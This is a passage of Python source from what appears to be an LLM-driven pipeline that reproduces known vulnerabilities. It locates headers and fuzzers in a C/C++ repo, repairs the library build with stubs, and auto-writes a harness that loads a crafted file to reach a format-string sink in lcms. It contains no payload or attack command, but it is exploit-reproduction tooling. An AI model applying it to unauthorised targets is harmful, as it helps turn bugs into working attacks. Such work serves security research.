                if fn and len(fn) > 3 and fn.lower() not in GENERIC and not fn.startswith("<") and not fn.isupper() and ("_" in fn or len(fn) > 8):
                    search_terms.append(fn)
        if self.sink_function.lower() not in GENERIC and len(self.sink_function) > 3:
            search_terms.insert(0, self.sink_function)
        search_terms = list(dict.fromkeys(search_terms))[:5]

        sink_dir = self.sink_file.rsplit("/",1)[0] if "/" in self.sink_file else ""
        for term in search_terms:
            hdr_r = self.env.exec(f"grep -rn '{term}' /src/ --include='*.h' -l 2>/dev/null | head -10", timeout=10)
            if not hdr_r.stdout.strip(): continue
            candidates = [h.strip() for h in hdr_r.stdout.strip().split("\n") if h.strip()]
            best = candidates[0]
            for c in candidates:
                if sink_dir and sink_dir.split("/")[0] in c: best = c; break
                if "/include/" in c: best = c; break
            so.header_file = best; break
        if not so.header_file and sink_dir:
            near = self.env.exec(f"find /src/{sink_dir}/.. -name '*.h' -path '*/include/*' 2>/dev/null | head -5", timeout=10)
            if near.stdout.strip(): so.header_file = near.stdout.strip().split("\n")[0].strip()

        if so.header_file:
            hdr_dir = so.header_file.rsplit("/",1)[0] if "/" in so.header_file else ""
            if hdr_dir:
                so.include_flags = f"-I{hdr_dir}"
                parent = hdr_dir.rsplit("/",1)[0] if "/" in hdr_dir else ""
                if parent and parent != "/src": so.include_flags = f"-I{hdr_dir} -I{parent}"
            sf = search_terms[0] if search_terms else self.sink_function
            decl = self.env.exec(f"grep -n '{sf}' {so.header_file} 2>/dev/null | head -3", timeout=5)
            if decl.stdout.strip():
                try:
                    ln = int(decl.stdout.strip().split(":")[0])
                    hdr_src = self.env.exec(f"sed -n '{max(1,ln-5)},{ln+10}p' {so.header_file} 2>/dev/null", timeout=5)
                    so.header_declarations = hdr_src.stdout.strip()[:1000] if hdr_src.stdout.strip() else ""
                except ValueError: pass

        fuzz = self.env.exec("find /src -name '*fuzz*' \\( -name '*.c' -o -name '*.cc' -o -name '*.cpp' \\) 2>/dev/null | head -5", timeout=10)
        if fuzz.stdout.strip():
            best = fuzz.stdout.strip().split("\n")[0].strip()
            sd = self.sink_file.rsplit("/",1)[0] if "/" in self.sink_file else ""
            for ff in fuzz.stdout.strip().split("\n"):
                if sd and sd in ff.strip(): best = ff.strip(); break
            src = self.env.exec(f"head -80 {best} 2>/dev/null", timeout=5)
            so.reference_harness = src.stdout.strip()[:2000] if src.stdout.strip() else ""

        for kws, fmt, ext in [
            (("cms","lcms","icc","cgats","it8"), "CGATS/ICC", ".it8"),
            (("pdf","fpdf"), "PDF", ".pdf"),
            (("xml","expat"), "XML", ".xml"),
            (("png",), "PNG", ".png"),
        ]:
            if any(k in (so.sink_file+so.entry_file+so.sink_source).lower() for k in kws):
                so.input_format, so.input_ext = fmt, ext; break

        test_r = self.env.exec(f"find /src -type f \\( -name '*{so.input_ext}' -o -name '*.pdf' -o -name '*.it8' -o -name '*.icc' -o -name '*.xml' -o -name '*.png' \\) 2>/dev/null | head -20", timeout=10)
        if test_r.stdout.strip():
            so.test_files = [f.strip() for f in test_r.stdout.strip().split("\n") if f.strip()]

        ls = self.env.exec("ls /src/ | head -30", timeout=5)
        so.repo_layout = ls.stdout.strip()[:500] if ls.stdout.strip() else ""
        pub = self.env.exec("find /src -path '*/include/*.h' -o -path '*/public/*.h' | head -10", timeout=5)
        if pub.stdout.strip() and not so.include_flags:
            so.include_flags = f"-I{pub.stdout.strip().split(chr(10))[0].strip().rsplit('/',1)[0]}"
        if "-I/src" not in so.include_flags: so.include_flags = f"-I/src {so.include_flags}".strip()

        build_r = self.env.exec("cat /work/build_info.json 2>/dev/null", timeout=5)
        if build_r.success and build_r.stdout.strip():
            import json
            try:
                info = json.loads(build_r.stdout.strip())
                so.prebuild_success = info.get("success", False)
                so.prebuild_archive = info.get("archive", "")
                so.prebuild_objects = info.get("objects", [])
                so.prebuild_compile_flags = info.get("compile_flags", "")
                so.prebuild_sink_obj = info.get("sink_obj", "")
                so.library_root = info.get("library_root", "")
                so.prebuild_failed_detail = info.get("failed_detail", [])
                so.prebuild_undefined_symbols = info.get("undefined_symbols", [])
                so.prebuild_internal_headers = info.get("internal_headers", [])
                so.prebuild_verify_ok = info.get("verify_ok", False)
                if so.prebuild_compile_flags:
                    so.include_flags = so.prebuild_compile_flags
                    if "-I/src" not in so.include_flags: so.include_flags = f"-I/src {so.include_flags}"
            except (json.JSONDecodeError, KeyError) as e:
                logger.warning("UNDERSTAND: failed to parse build_info.json: %s", e)

        # (8) Resolve callable target + build call chain from trace
        self._extract_trace_intelligence()

    def _extract_trace_intelligence(self):
        """Extract callable_target and call_chain from the Joern trace.

        The TracePath from Joern/ACO already contains the exact data-flow
        path from entry to sink, with file:line and code snippets at each
        step.  This is FAR more accurate than grepping the codebase.

        This method:
          1. Walks the trace to find which steps are real function calls
          2. Sets callable_target to the nearest callable function to the sink
          3. Builds call_chain text showing the LLM exactly how to reach the sink
          4. Falls back to grep only if the trace is too shallow (< 3 steps)
        """
        so = self.so
        sink = so.sink_function
        trace = self.trace

        if not trace.steps or not sink:
            so.callable_target = sink
            return

        # ── Step 1: Classify each trace step as callable or not ──────
        # A step is "callable" if its node_name looks like a function
        # (not a variable, operator, or keyword)
        NON_CALLABLE = {"if", "for", "while", "switch", "return", "sizeof",
                        "typeof", "else", "do", "case", "break", "continue",
                        "void", "int", "char", "bool", "auto", "const"}

        callable_steps = []  # (index, function_name, step)
        for i, step in enumerate(trace.steps):
            if not step.node_name:
                continue
            for part in step.node_name.split("|"):
                name = part.strip()
                if (name and len(name) > 2
                        and name.lower() not in NON_CALLABLE
                        and not name.startswith("<")
                        and "=" not in name
                        and "." not in name
                        and "[" not in name):
                    # Check if it appears with "(" in the code snippet — strong signal it's callable
                    snippet = step.code_snippet or ""
                    if f"{name}(" in snippet or f"{name} (" in snippet:
                        callable_steps.append((i, name, step))
                        break
                    # Also accept if it's in a CALL edge
                    if step.edge_kind and "call" in str(step.edge_kind).lower():
                        callable_steps.append((i, name, step))
                        break

        # ── Step 2: Find callable_target ─────────────────────────────
        # Walk backwards from the sink to find the nearest callable function
        # that the harness can invoke.  Skip libc/system functions — GDB
        # can't reliably breakpoint on them (snprintf → __GI___snprintf).
        LIBC_FUNCS = {"snprintf", "sprintf", "printf", "fprintf", "vsnprintf",
                      "vsprintf", "vfprintf", "vprintf", "sscanf", "fscanf",
                      "memcpy", "memmove", "memset", "strcpy", "strncpy",
                      "strcat", "strncat", "strlen", "strcmp", "strncmp",
                      "malloc", "calloc", "realloc", "free",
                      "fopen", "fclose", "fread", "fwrite", "fseek", "ftell",
                      "read", "write", "open", "close", "exit", "abort"}

        sink_is_callable = any(name == sink for _, name, _ in callable_steps)

        if sink_is_callable and sink not in LIBC_FUNCS:
            so.callable_target = sink
            logger.info("TRACE: sink '%s' is directly callable", sink)
        else:
            # Find nearest LIBRARY function (not libc) going backward
            found = False
            for idx, name, step in reversed(callable_steps):
                if name in LIBC_FUNCS:
                    continue  # skip libc functions
                so.callable_target = name
                logger.info("TRACE: sink '%s' is not callable → resolved to '%s' "
                            "(step %d: %s)", sink, name, idx,
                            step.code_snippet[:60] if step.code_snippet else "?")
                found = True
                break
            if not found:
                # All callable steps are libc — use the entry function instead
                if callable_steps:
                    # Pick the first (entry-most) callable, even if libc
                    idx, name, step = callable_steps[0]
                    so.callable_target = name
                    logger.info("TRACE: only libc callables found → using entry '%s'", name)
                else:
                    so.callable_target = sink
                    logger.warning("TRACE: could not find callable in trace, using sink '%s'", sink)
                    if self.env.is_running:
                        self._resolve_callable_target_grep()

        # ── Step 3: Build call chain from trace steps ────────────────
        # This replaces _discover_call_chain's grep-based approach.
        # The trace steps ARE the call chain, with real code from Joern.
        if len(trace.steps) >= 3:
            chain_parts = []
            prev_file = ""
            for i, step in enumerate(trace.steps):
                loc = step.location
                if not loc or not loc.file:
                    continue
                loc_str = f"{loc.file}:{loc.line}"
                is_entry = (i == 0)
                is_sink = (i == len(trace.steps) - 1)
                tag = " [ENTRY - call this]" if is_entry else (" [SINK - vulnerability here]" if is_sink else "")
                name = step.node_name or "?"
                snippet = (step.code_snippet or "")[:200]

                # Only show steps that cross file boundaries or are entry/sink
                if loc.file != prev_file or is_entry or is_sink:
                    chain_parts.append(
                        f"Step {i}{tag}: {name} @ {loc_str}\n"
                        f"  Code: {snippet}")
                    prev_file = loc.file

                    # Check if this function is in the public header
                    for _, fname, _ in callable_steps:
                        if fname == name and so.header_file and self.env.is_running:
                            hdr_check = self.env.exec(
                                f"grep '{fname}' {so.header_file} 2>/dev/null | head -1",
                                timeout=3)
                            if hdr_check.stdout.strip():
                                chain_parts.append(
                                    f"  ✅ PUBLIC API: {fname} found in {so.header_file}")
                            break

            if chain_parts:
                so.call_chain = "\n".join(chain_parts)
                logger.info("TRACE: built call chain with %d steps from Joern trace",
                            len(chain_parts))
        elif self.env.is_running:
            # Trace too shallow — fall back to grep-based discovery
            # (will be triggered lazily after 2 stub failures)
            logger.info("TRACE: only %d steps — call chain will use grep fallback if needed",
                        len(trace.steps))

    def _discover_data_source(self, so, sink_loc):
        """Find where the attacker-controlled data enters the vulnerable sink.

        When the sink code accesses a struct member like:
            snprintf(Buffer, 1023, it8->DoubleFormatter, Val);
        the LLM needs to know WHERE DoubleFormatter is WRITTEN — that's the
        actual attack surface the harness must target.

        This greps for assignments to the struct member and shows the LLM
        the parser/loader code that populates it.
        """
        if not self.env.is_running or not so.sink_source:
            return

        # Extract struct member accesses from sink source
        # Patterns: ptr->Field, obj.Field, struct->field
        members = re.findall(r'(\w+)->(\w+)', so.sink_source)
        members += re.findall(r'(\w+)\.(\w+)', so.sink_source)

        # Filter to interesting members (skip common ones like ->Next, ->size)
        skip_members = {"Next", "next", "Prev", "prev", "size", "Size",
                        "length", "Length", "count", "Count", "type", "Type",
                        "data", "Data", "ptr", "Ptr", "buf", "line", "col"}
        interesting = [(var, field) for var, field in members
                       if field not in skip_members and len(field) > 3]

        if not interesting:
            return

        data_sources = []
        sink_file = sink_loc.file if sink_loc else so.sink_file

        for var_name, field_name in interesting[:3]:  # check up to 3 members
            # Find where this field is WRITTEN in the same file and related files
            # Look for: ->Field = , ->Field, strncpy/strcpy/memcpy(...->Field
            write_r = self.env.exec(
                f"grep -rn '{field_name}' /src/{sink_file} 2>/dev/null "
                f"| grep -E '=|strcpy|strncpy|memcpy|sprintf|sscanf|fread|fgets' "
                f"| grep -v '//' | head -10",
                timeout=10)

            if not write_r.stdout.strip():
                # Try broader search in related files
                sink_dir = sink_file.rsplit("/", 1)[0] if "/" in sink_file else ""
                if sink_dir:
                    write_r = self.env.exec(
                        f"grep -rn '{field_name}' /src/{sink_dir}/ --include='*.c' --include='*.cpp' 2>/dev/null "
                        f"| grep -E '=|strcpy|strncpy|memcpy|sprintf|sscanf' "
                        f"| grep -v '//' | head -10",
                        timeout=10)

            if not write_r.stdout.strip():
                continue

            # Read context around the write locations
            write_contexts = []
            for wline in write_r.stdout.strip().split("\n")[:3]:
                parts = wline.split(":", 2)
                if len(parts) < 3:
                    continue
                wfile, wlineno = parts[0], parts[1]
                try:
                    ln = int(wlineno)
                except ValueError:
                    continue

                # Read ±8 lines around the write
                ctx_r = self.env.exec(
                    f"sed -n '{max(1, ln - 8)},{ln + 8}p' {wfile} 2>/dev/null",
                    timeout=5)
                if ctx_r.stdout.strip():
                    write_contexts.append(
                        f"  {wfile}:{ln} — {field_name} is written here:\n"
                        f"{ctx_r.stdout.strip()[:600]}")

            if write_contexts:
                data_sources.append(
                    f"\n--- {var_name}->{field_name}: HOW IT GETS SET ---\n"
                    + "\n\n".join(write_contexts))

        if data_sources:
            so.data_source_info = "\n".join(data_sources)
            logger.info("UNDERSTAND: found %d data source(s) for sink struct members",
                        len(data_sources))

    def _resolve_callable_target_grep(self):
        """Grep fallback for callable_target when trace is too shallow."""
        so = self.so
        sink = so.sink_function
        if not sink:
            return

        # Check if sink is callable via grep
        call_check = self.env.exec(
            f"grep -rn '{sink}\\s*(' /src/ --include='*.c' --include='*.cpp' --include='*.h' "
            f"2>/dev/null | grep -v 'define\\|typedef' | head -3",
            timeout=10)
        if call_check.stdout.strip():
            so.callable_target = sink
            return

        # Find enclosing function from sink source
        if so.sink_file:
            sink_path = self.env.exec(
                f"find /src -path '*/{so.sink_file}' -type f 2>/dev/null | head -1",
                timeout=5)
            if sink_path.stdout.strip():
                sink_loc = self.trace.steps[-1].location if self.trace.steps else None
                if sink_loc and sink_loc.line:
                    func_r = self.env.exec(
                        f"head -n {sink_loc.line} {sink_path.stdout.strip()} 2>/dev/null | "
                        f"grep -n '^[a-zA-Z].*(' | tail -5",
                        timeout=5)
                    if func_r.stdout.strip():
                        for fline in reversed(func_r.stdout.strip().split("\n")):
                            m = re.search(r'(\w+)\s*\(', fline)
                            if m and m.group(1) not in ("if", "for", "while", "switch",
                                                         "return", "sizeof", "typeof"):
                                so.callable_target = m.group(1)
                                logger.info("GREP fallback: callable_target = '%s'",
                                            so.callable_target)
                                return

    # =================================================================
    # STAGE 1: EXPLORE
    # =================================================================

    def _run_explore_turn(self, result, turn_log):
        self._explore_turns += 1; so = self.so
        missing = []
        if not so.header_file: missing.append(f"Find the header for {so.sink_function}: grep -rn '{so.sink_function}' /src/ --include='*.h' -l")
        if not so.reference_harness: missing.append("Find a fuzzer/test: find /src -name '*fuzz*' -o -name '*test*'")
        if not so.test_files: missing.append(f"Find sample inputs: find /src -type f -name '*{so.input_ext}'")
        if not missing:
            self.stage = Stage.WRITE; self._exchanges.clear(); return
        prompt = f"STATE:\n{so.summary()}\n\nMISSING:\n" + "\n".join(f"  {i+1}. {m}" for i,m in enumerate(missing)) + "\n\nFind these. Use <shell>."
        resp = self._call_llm(self.llm_a, "You are exploring a C/C++ repo at /src/.\n"+_TOOLS_BLOCK, prompt)
        turn_log["llm_response"] = resp[:4000]
        actions = parse_actions(resp)
        if not actions: return
        results = self._exec_actions(actions[:self.config.max_actions_per_turn], result)
        self._exchanges.append((resp[:1500], results[:1500])); self._exchanges = self._exchanges[-2:]
        for line in results.split("\n"):
            line = line.strip()
            if line.endswith(".h") and "/src/" in line and not so.header_file:
                so.header_file = line; so.include_flags = f"-I{line.rsplit('/',1)[0]}"
        if so.header_file or self._explore_turns >= 6:
            self.stage = Stage.WRITE; self._exchanges.clear()

    # =================================================================
    # STAGE 1.5: BUILD
    # =================================================================

    def _run_build_turn(self, result, turn_log):
        self._build_turns += 1; so = self.so
        vr = self.env.exec("test -x /work/build/verify && ASAN_OPTIONS=detect_leaks=0 /work/build/verify 2>&1", timeout=10)
        if vr.exit_code == 0 and "OK:" in (vr.output or ""):
            so.prebuild_verify_ok = True; self._exchanges.clear()
            self.stage = Stage.LINK if self.env.exec("test -f /work/harness.o && echo y", timeout=3).stdout.strip() == "y" else Stage.WRITE
            if self.stage == Stage.LINK: self.env.exec("rm -f /work/harness", timeout=3)
            turn_log["gate"] = f"BUILD PASS → {self.stage.name}"; return
        if self._build_turns > self._MAX_BUILD_TURNS:
            self.stage = Stage.WRITE; self._exchanges.clear(); return

        archive = so.prebuild_archive or "/work/build/libtarget.a"
        flags = so.prebuild_compile_flags or so.include_flags or "-I/src"

        verify_crash = ""
        if self.env.exec("test -f /work/build/verify.o && echo y", timeout=3).stdout.strip() == "y":
            self.env.exec(f"gcc -fsanitize=address -g /work/build/verify.o {archive} -o /work/build/verify -Wl,--unresolved-symbols=ignore-in-object-files -lm -lpthread 2>&1", timeout=30)
            if self.env.exec("test -x /work/build/verify && echo y", timeout=3).stdout.strip() == "y":
                vv = self.env.exec("ASAN_OPTIONS=detect_leaks=0 /work/build/verify 2>&1", timeout=10)
                if vv.exit_code != 0: verify_crash = (vv.output or "")[:1500]

        internal_hdr = ""
        if so.prebuild_internal_headers:
            r = self.env.exec(f"head -n 400 {so.prebuild_internal_headers[0]} 2>/dev/null", timeout=5)
            if r.stdout.strip(): internal_hdr = re.sub(r'/\*.*?\*/', '', r.stdout.strip(), flags=re.DOTALL)[:3000]

        crash_src = ""; crashing_file = ""
        ct = verify_crash or so.run_output or ""
        cm = re.search(r'in \w+ (/src/[^:]+):(\d+)', ct)
        if cm:
            crashing_file = cm.group(1)
            r = self.env.exec(f"sed -n '{max(1,int(cm.group(2))-10)},{int(cm.group(2))+10}p' {crashing_file} 2>/dev/null", timeout=5)
            if r.stdout.strip(): crash_src = r.stdout.strip()[:1500]

        ar_contents = ""
        ar_r = self.env.exec(f"ar t {archive} 2>/dev/null | head -30", timeout=5)
        if ar_r.stdout.strip(): ar_contents = ar_r.stdout.strip()

        sections = [f"TASK: Fix the library build.\n\n{so.summary()}"]
        if so.prebuild_failed_detail:
            sections.append("\n=== FAILED FILES ===")
            for fd in so.prebuild_failed_detail[:5]: sections.append(f"  {fd.get('source','?')}: {fd.get('error','?')[:200]}")
        elif not so.prebuild_verify_ok:
            sections.append("\n=== RUNTIME CRASH — replace crashing .o with stubs using malloc/calloc/free ===")
        if so.prebuild_undefined_symbols: sections.append(f"\n=== UNDEFINED SYMBOLS ===\n{', '.join(so.prebuild_undefined_symbols[:20])}")
        if verify_crash: sections.append(f"\n=== CRASH TRACE ===\n{verify_crash}")
        elif so.run_output and "AddressSanitizer" in so.run_output:
            al = [l.strip() for l in so.run_output.split("\n") if l.strip().startswith("#") or "ERROR:" in l or "SUMMARY:" in l]
            if al: sections.append(f"\n=== CRASH TRACE ===\n" + "\n".join(al[:20]))
        if internal_hdr: sections.append(f"\n=== KEY TYPES ({so.prebuild_internal_headers[0]}) ===\n{internal_hdr}")
        if crash_src: sections.append(f"\n=== CRASHING SOURCE ({crashing_file}) ===\n{crash_src}")
        if ar_contents: sections.append(f"\n=== ARCHIVE ({archive}) ===\n{ar_contents}")
        sections.append(f"\n=== BUILD ENV ===\nArchive: {archive}\nCFLAGS: {flags}\nCompiled: {len(so.prebuild_objects)} objects")
        for _, res in self._exchanges[-2:]: sections.append(f"\n--- Previous ---\n{res[:1500]}")

        efn = self._clean_entry_fn()
        crash_obj = ""
        if crashing_file and ar_contents:
            ob = crashing_file.split("/")[-1].replace(".c","")
            for line in ar_contents.split("\n"):
                if ob in line: crash_obj = line.strip(); break

        td = f"""
=== YOUR TASK ===
Write TWO files NOW:
1. <write_file path="/work/build/stubs.c"> (implement missing functions with malloc/calloc/free) </write_file>
2. <write_file path="/work/build/verify.c"> (call {efn}, print "OK:" on success) </write_file>
3-8. Compile stubs, {'replace ' + crash_obj + ' in' if crash_obj else 'update'} archive, compile+link+run verify with ASAN_OPTIONS=detect_leaks=0

⚠️ CRITICAL: Do NOT stub __asan_*, __sanitizer_*, or __ubsan_* functions.
These are provided by -fsanitize=address at link time. Stubbing them BREAKS ASAN
and causes DEADLYSIGNAL crashes. Only stub LIBRARY functions (FXMEM_*, _cms*, etc).
"""
        sections.append(td)
        resp = self._call_llm(self.llm_b, "Fix the C library. Write stubs.c AND verify.c. All context above.\n"+_TOOLS_BLOCK, "\n".join(sections))
        turn_log["llm_response"] = resp[:4000]
        actions = parse_actions(resp)
        if not actions: return
        results = self._exec_actions(actions[:self.config.max_actions_per_turn], result)
        self._exchanges.append((resp[:1500], results[:1500])); self._exchanges = self._exchanges[-2:]

        # ══════════════════════════════════════════════════════════════
        # FRAMEWORK ALWAYS HAS THE LAST WORD ON THE ARCHIVE.
        # The LLM runs shell commands that compile poisoned stubs.c and
        # add them to the archive (ar rcs libtarget.a stubs.o).  This
        # bypasses all our cleanup.  Fix: AFTER all actions complete,
        # unconditionally re-clean stubs.c, re-compile, and rebuild
        # the archive.  It doesn't matter what the LLM did — we redo it.
        # ══════════════════════════════════════════════════════════════

        if self.env.exec("test -f /work/build/stubs.c && echo y", timeout=3).stdout.strip() == "y":
            # ── CLEANUP 1: Strip ASAN stubs ──────────────────────────
            self.env.exec(
                r"sed -i '/__asan_\|__sanitizer_\|__ubsan_\|__tsan_/d' /work/build/stubs.c",
                timeout=5)
            self.env.exec(
                r"sed -i '/asan_option/d' /work/build/stubs.c",
                timeout=5)

            # ── CLEANUP 2: Strip snprintf/printf stubs ───────────────
            # The LLM sometimes stubs snprintf itself (!), which makes
            # the format string vulnerability impossible to trigger.
            self.env.exec(
                r"sed -i '/^int snprintf\|^int sprintf\|^int vsnprintf\|^int printf/,/^}/d' /work/build/stubs.c",
                timeout=5)

            # ── CLEANUP 3: Strip duplicate library symbols ───────────
            crash_obj_syms = set()
            if crashing_file:
                ob = crashing_file.split("/")[-1].replace(".c","")
                crash_obj_in_ar = ""
                for line in (ar_contents or "").split("\n"):
                    if ob in line:
                        crash_obj_in_ar = line.strip()
                        break
                if crash_obj_in_ar:
                    crash_syms_r = self.env.exec(
                        f"ar p {archive} {crash_obj_in_ar} 2>/dev/null | nm --defined-only - 2>/dev/null | awk '{{print $3}}'",
                        timeout=10)
                    if crash_syms_r.stdout.strip():
                        crash_obj_syms = set(crash_syms_r.stdout.strip().split("\n"))
                        logger.info("BUILD: crashing object %s has %d symbols (keeping these in stubs)",
                                    crash_obj_in_ar, len(crash_obj_syms))

            existing_syms_r = self.env.exec(
                f"nm --defined-only {archive} 2>/dev/null | awk '{{print $3}}' | sort -u",
                timeout=10)
            if existing_syms_r.stdout.strip():
                existing_syms = set(existing_syms_r.stdout.strip().split("\n"))
                safe_syms = existing_syms - crash_obj_syms
                stubs_src = self.env.exec("cat /work/build/stubs.c 2>/dev/null", timeout=5).stdout or ""
                if stubs_src and safe_syms:
                    cleaned_lines = []
                    skip_until_close = False
                    brace_depth = 0
                    for line in stubs_src.split("\n"):
                        if skip_until_close:
                            brace_depth += line.count("{") - line.count("}")
                            if brace_depth <= 0:
                                skip_until_close = False
                            continue
                        m = re.match(r'^[\w\s\*]+\b(\w+)\s*\(', line)
                        if m:
                            func_name = m.group(1)
                            if func_name in safe_syms and func_name not in (
                                    "main", "if", "for", "while", "switch", "return"):
                                brace_depth = line.count("{") - line.count("}")
                                if brace_depth > 0 or "{" not in line:
                                    skip_until_close = True
                                logger.info("BUILD: stripped duplicate stub: %s", func_name)
                                continue
                        cleaned_lines.append(line)
                    self.env.write_file("/work/build/stubs.c", "\n".join(cleaned_lines))

            # ── RECOMPILE stubs.c (overrides whatever LLM compiled) ──
            comp = self.env.exec(f"gcc -fsanitize=address -g {flags} -c /work/build/stubs.c -o /work/build/stubs.o 2>&1", timeout=30)
            if self.env.exec("test -f /work/build/stubs.o && echo y", timeout=3).stdout.strip() == "y":
                # Delete crashing object from archive
                if crashing_file:
                    ob = crashing_file.split("/")[-1].replace(".c","")
                    for obj_name in (self.env.exec(f"ar t {archive} 2>/dev/null", timeout=5).stdout or "").strip().split("\n"):
                        if ob in obj_name: self.env.exec(f"ar d {archive} {obj_name} 2>/dev/null", timeout=5); break
                # Replace stubs in archive
                self.env.exec(f"ar d {archive} stubs.o 2>/dev/null", timeout=5)
                self.env.exec(f"ar rcs {archive} /work/build/stubs.o", timeout=10)
                logger.info("BUILD: archive rebuilt with clean stubs")
            else:
                self._exchanges.append(("(system)", f"⚠️ stubs.c FAILED:\n{(comp.output or '')[:400]}"))

        if self.env.exec("test -f /work/build/verify.c && echo y", timeout=3).stdout.strip() == "y":
            self.env.exec(f"gcc -fsanitize=address -g {flags} -c /work/build/verify.c -o /work/build/verify.o 2>/dev/null", timeout=15)
        if self.env.exec("test -f /work/build/verify.o && echo y", timeout=3).stdout.strip() == "y":
            self.env.exec(f"gcc -fsanitize=address -g /work/build/verify.o {archive} -o /work/build/verify -lm -lpthread 2>&1", timeout=30)
            if self.env.exec("test -x /work/build/verify && echo y", timeout=3).stdout.strip() != "y":
                self.env.exec(f"gcc -fsanitize=address -g /work/build/verify.o {archive} -o /work/build/verify -Wl,--unresolved-symbols=ignore-in-object-files -lm -lpthread 2>&1", timeout=30)
            if self.env.exec("test -x /work/build/verify && echo y", timeout=3).stdout.strip() == "y":
                vr2 = self.env.exec("ASAN_OPTIONS=detect_leaks=0 /work/build/verify 2>&1", timeout=10)
                if vr2.exit_code == 0 and "OK:" in (vr2.output or ""):
                    so.prebuild_verify_ok = True; self._exchanges.clear()
                    self.stage = Stage.LINK if self.env.exec("test -f /work/harness.o && echo y", timeout=3).stdout.strip() == "y" else Stage.WRITE
                    if self.stage == Stage.LINK: self.env.exec("rm -f /work/harness", timeout=3)
                    turn_log["gate"] = f"BUILD PASS → {self.stage.name}"; return

    # =================================================================
    # STAGE 2: WRITE
    # =================================================================

    def _run_write_turn(self, result, turn_log):
        so = self.so; self._write_attempts += 1
        so.sink_confirmed_reachable = False  # new harness = must re-check

        # ── REFLECTION: after 3+ failed cycles, analyze what's wrong ──
        # Runs at pipeline_attempts 3 (first reflection) and 6 (second, with updated context).
        should_reflect = (
            (so.pipeline_attempts >= 3 and not so.reflection_insight) or
            (so.pipeline_attempts >= 6 and "round2" not in so.reflection_insight)
        )
        if should_reflect:
            if so.pipeline_attempts >= 6:
                so.reflection_insight = ""  # clear stale reflection
            self._run_reflect()
            if so.pipeline_attempts >= 6 and so.reflection_insight:
                so.reflection_insight += "\n[round2]"  # mark as second reflection
            turn_log["reflection"] = so.reflection_insight[:500] if so.reflection_insight else "(empty)"

            # ── SHORTCUT: If REFLECT identifies file-based input, build the ──
            # ── harness ourselves and go DIRECTLY to INPUT_REFLECTION ────────
            # This bypasses the LLM for harness creation entirely.
            # The LLM only needs to produce the malicious file content.
            if so.reflection_insight and self.env.is_running:
                import re as _re
                file_keywords = ["loadfromfile", "loadfrommem", "file parsing",
                                 "load a file", "crafted file", ".it8", ".icc",
                                 "input_type: file", "input file", "malicious file"]
                is_file_based = any(kw in so.reflection_insight.lower() for kw in file_keywords)

                if is_file_based:
                    logger.info("REFLECT → file-based input detected, building harness automatically")

                    # Find the load function from the header
                    load_fn = "cmsIT8LoadFromFile"  # default
                    if so.header_declarations:
                        for fn in _re.findall(r'\b(\w+(?:Load|Read|Parse)(?:FromFile|FromMem)\w*)\s*\(', so.header_declarations):
                            load_fn = fn; break
                    if not so.header_declarations and so.header_file:
                        grep_r = self.env.exec(
                            f"grep -oE '\\w+(LoadFromFile|LoadFromMem)\\w*' /src/{so.header_file} 2>/dev/null | head -3",
                            timeout=5)
                        if grep_r.stdout.strip():
                            load_fn = grep_r.stdout.strip().split("\n")[0].strip()

                    ct = so.callable_target or so.sink_function
                    hdr = so.header_file.split('/')[-1] if so.header_file else 'lcms2.h'

                    # Determine cleanup function
                    free_fn = "cmsIT8Free"
                    if so.header_declarations:
                        for fn in _re.findall(r'\b(\w+(?:Free|Destroy|Close)\w*)\s*\(', so.header_declarations):
                            if "IT8" in fn or "CGATS" in fn:
                                free_fn = fn; break

                    harness_src = f'''#include "{hdr}"
#include <stdio.h>
#include <string.h>

int main(int argc, char** argv) {{
    if (argc != 2) {{ fprintf(stderr, "Usage: %s <input>\\n", argv[0]); return 1; }}
    cmsHANDLE h = {load_fn}(NULL, argv[1]);
    if (!h) {{ fprintf(stderr, "Failed to load: %s\\n", argv[1]); return 1; }}
    {ct}(h, "TRIGGER", 3.14159);
    {free_fn}(h);
    return 0;
}}'''
                    # Write, compile, link — all framework-driven
                    self.env.write_file("/work/harness.cpp", harness_src)
                    so.last_harness_source = harness_src

                    comp_r = self.env.exec(
                        f"g++ -fsanitize=address -g -std=c++17 {so.include_flags} "
                        f"/work/harness.cpp -c -o /work/harness.o 2>&1", timeout=30)

                    if comp_r.exit_code == 0:
                        archive = so.prebuild_archive or "/work/build/libtarget.a"
                        link_r = self.env.exec(
                            f"g++ -fsanitize=address -g /work/harness.o {archive} "
                            f"-Wl,--unresolved-symbols=ignore-in-object-files "
                            f"-o /work/harness -lpthread -ldl -lm 2>&1", timeout=30)

                        if link_r.exit_code == 0:
                            logger.info("REFLECT → harness auto-built successfully → INPUT_REFLECTION")
                            self.stage = Stage.INPUT_REFLECTION
                            return  # skip the rest of _run_write_turn
                        else:
                            logger.warning("REFLECT → auto-link failed: %s", link_r.output[:200] if link_r.output else "?")
                    else:
                        logger.warning("REFLECT → auto-compile failed: %s", comp_r.output[:200] if comp_r.output else "?")

        include_line = ""
        if so.header_file:
            bn = so.header_file.split("/")[-1]
            iflags = sorted([f for f in so.include_flags.split() if f.startswith("-I")], key=lambda f: -len(f))
            for flag in iflags:
                idir = flag[2:]
                if so.header_file.startswith(idir + "/"):
                    include_line = f'#include "{so.header_file[len(idir)+1:]}"'; break
            if not include_line: include_line = f'#include "{bn}"'

        # Track consecutive turns where LLM explored but didn't write
        no_write_count = 0
        for reason in reversed(so.backward_reasons):
            if "explored but did NOT write" in reason:
                no_write_count += 1
            else:
                break

        sections = [f"TASK: Write /work/harness.cpp\n\n{so.summary()}"]

        # After 1+ exploration-only turns, lead with an urgent directive
        if no_write_count >= 1:
            sections.insert(0,
                f"⚠️⚠️ MANDATORY: Your FIRST action MUST be <write_file path=\"/work/harness.cpp\">. "
                f"You have spent {no_write_count} turn(s) exploring. STOP exploring and WRITE THE FILE NOW. "
                f"Do NOT output any <shell> commands before the <write_file> block.")

        if include_line:
            sections.append(f"\n⚠️ CRITICAL: Use EXACTLY: {include_line}")
            sections.append(f"Compile: g++ -fsanitize=address -g -std=c++17 {so.include_flags} /work/harness.cpp -c -o /work/harness.o")
        if so.sink_source: sections.append(f"\n=== SINK ({so.sink_file}) ===\n{so.sink_source}")
        if so.data_source_info:
            sections.append(f"\n=== HOW ATTACKER DATA REACHES THE SINK ===\n"
                            f"The sink uses struct members that are populated elsewhere.\n"
                            f"Your harness must set these fields through the CORRECT mechanism "
                            f"(e.g., loading a crafted file, not calling a property setter).\n"
                            f"{so.data_source_info}")
        if so.entry_source: sections.append(f"\n=== ENTRY ({so.entry_file}) ===\n{so.entry_source}")
        if so.header_declarations: sections.append(f"\n=== API HEADER ({so.header_file}) ===\n{so.header_declarations}")
